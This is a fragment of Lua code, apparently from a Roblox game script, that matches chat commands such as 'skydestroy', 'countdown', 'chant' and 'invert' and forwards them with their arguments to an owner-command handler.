    elseif cmd == "cpskydestroy" or cmd == "skydestroy" then
        local tArg, modeArg = arg:match("^(%S+)%s*(.-)$")
        handleIncomingOwnerCommand(senderPlr, "skydestroy", nil, (tArg and tArg ~= "") and tArg or "all", modeArg)
    elseif cmd == "cpskystop" or cmd == "skystop" then
        handleIncomingOwnerCommand(senderPlr, "skystop", nil, arg ~= "" and arg or "all")
    elseif cmd == "cpcountdown" or cmd == "countdown" then
        handleIncomingOwnerCommand(senderPlr, "countdown", nil, "all", arg)
    elseif cmd == "cpwavechat" or cmd == "wavechat" then
        handleIncomingOwnerCommand(senderPlr, "wavechat", nil, "all", arg)
    elseif cmd == "cpchant" or cmd == "chant" then
        handleIncomingOwnerCommand(senderPlr, "chant", nil, "all", arg)
    elseif cmd == "cpinvert" or cmd == "invert" then
        handleIncomingOwnerCommand(senderPlr, "invert", nil, arg ~= "" and arg or "all")
